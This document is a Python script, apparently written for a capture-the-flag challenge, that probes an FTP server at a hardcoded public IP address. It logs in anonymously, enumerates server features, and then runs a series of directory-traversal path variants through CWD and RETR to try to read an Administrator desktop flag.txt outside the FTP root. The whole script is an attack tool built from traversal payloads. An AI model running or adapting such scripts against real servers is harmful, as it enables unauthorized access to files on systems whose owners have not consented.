#!/usr/bin/env python3
"""
深入探测 FTP 服务
尝试各种 FTP 命令
"""

import socket
import re
import time

TARGET = "116.62.114.4"

class FTPClient:
    def __init__(self, host, port=21):
        self.host = host
        self.port = port
        self.sock = None
        self.debug = True
        
    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10)
        self.sock.connect((self.host, self.port))
        return self.recv()
        
    def send(self, cmd):
        if self.debug:
            print(f">>> {cmd}")
        self.sock.send((cmd + "\r\n").encode())
        return self.recv()
        
    def recv(self):
        self.sock.settimeout(3)
        data = b""
        try:
            while True:
                chunk = self.sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                # FTP 响应以 \r\n 结尾，且状态码后面跟着空格表示最后一行
                lines = data.decode('utf-8', errors='ignore').split('\r\n')
                if len(lines) >= 2 and lines[-2] and len(lines[-2]) >= 4:
                    if lines[-2][3] == ' ':  # 响应完成
                        break
        except socket.timeout:
            pass
        resp = data.decode('utf-8', errors='ignore')
        if self.debug and resp:
            for line in resp.strip().split('\n'):
                print(f"<<< {line.strip()}")
        return resp
        
    def parse_pasv(self, resp):
        match = re.search(r'\((\d+),(\d+),(\d+),(\d+),(\d+),(\d+)\)', resp)
        if match:
            nums = [int(x) for x in match.groups()]
            port = nums[4] * 256 + nums[5]
            return port
        return None
        
    def list_dir_active(self, path="/"):
        """使用 PORT 模式列出目录（主动模式）"""
        # 这在客户端 NAT 后面通常不工作，但值得尝试
        pass
        
    def list_dir(self, path="/"):
        """列出目录"""
        # 先切换目录
        resp = self.send(f"CWD {path}")
        
        # 进入 PASV 模式
        resp = self.send("PASV")
        port = self.parse_pasv(resp)
        
        if port:
            print(f"[*] Data port: {port}")
            
            try:
                data_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                data_sock.settimeout(10)
                data_sock.connect((self.host, port))
                
                resp = self.send("LIST")
                
                listing = b""
                while True:
                    try:
                        chunk = data_sock.recv(4096)
                        if not chunk:
                            break
                        listing += chunk
                    except:
                        break
                        
                data_sock.close()
                
                # 接收完成响应
                self.recv()
                
                return listing.decode('utf-8', errors='ignore')
                
            except Exception as e:
                print(f"[-] Data connection failed: {e}")
                
        return None
        
    def get_file(self, filepath):
        """下载文件"""
        resp = self.send("PASV")
        port = self.parse_pasv(resp)
        
        if port:
            print(f"[*] Data port: {port}")
            
            try:
                data_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                data_sock.settimeout(10)
                data_sock.connect((self.host, port))
                
                self.send("TYPE I")
                resp = self.send(f"RETR {filepath}")
                
                content = b""
                while True:
                    try:
                        chunk = data_sock.recv(4096)
                        if not chunk:
                            break
                        content += chunk
                    except:
                        break
                        
                data_sock.close()
                self.recv()
                
                return content
                
            except Exception as e:
                print(f"[-] Failed to get file: {e}")
                
        return None

def main():
    ftp = FTPClient(TARGET)
    ftp.debug = True
    
    print("[*] Connecting to FTP server...")
    print("="*60)
    banner = ftp.connect()
    
    print("\n[*] Anonymous login...")
    ftp.send("USER anonymous")
    ftp.send("PASS anonymous@test.com")
    
    print("\n[*] Getting server info...")
    ftp.send("SYST")
    ftp.send("FEAT")
    ftp.send("PWD")
    ftp.send("STAT")
    
    print("\n[*] Trying to list root...")
    listing = ftp.list_dir("/")
    if listing:
        print(f"\n--- Root listing ---\n{listing}")
    
    # 尝试不同的路径格式
    print("\n[*] Testing different path formats...")
    
    paths_to_try = [
        "C:",
        "C:\\",
        "C:/",
        "C:\\Users",
        "C:/Users",
        "/C:",
        "/C:/Users",
        "\\\\?\\C:\\Users",
        "..\\..\\..\\..\\Users",
        "....//....//....//Users",
    ]
    
    for path in paths_to_try:
        print(f"\n--- Trying CWD {path} ---")
        ftp.send(f"CWD {path}")
        ftp.send("PWD")
    
    # 直接尝试读取 flag
    print("\n[*] Attempting to read flag directly...")
    
    flag_paths = [
        "C:\\Users\\Administrator\\Desktop\\flag.txt",
        "C:/Users/Administrator/Desktop/flag.txt",
        "/Users/Administrator/Desktop/flag.txt",
        "\\Users\\Administrator\\Desktop\\flag.txt",
        "Users/Administrator/Desktop/flag.txt",
        "../../../Users/Administrator/Desktop/flag.txt",
        "..\\..\\..\\Users\\Administrator\\Desktop\\flag.txt",
    ]
    
    for path in flag_paths:
        print(f"\n--- Trying RETR {path} ---")
        content = ftp.get_file(path)
        if content:
            print(f"Content: {content}")

if __name__ == "__main__":
    main()
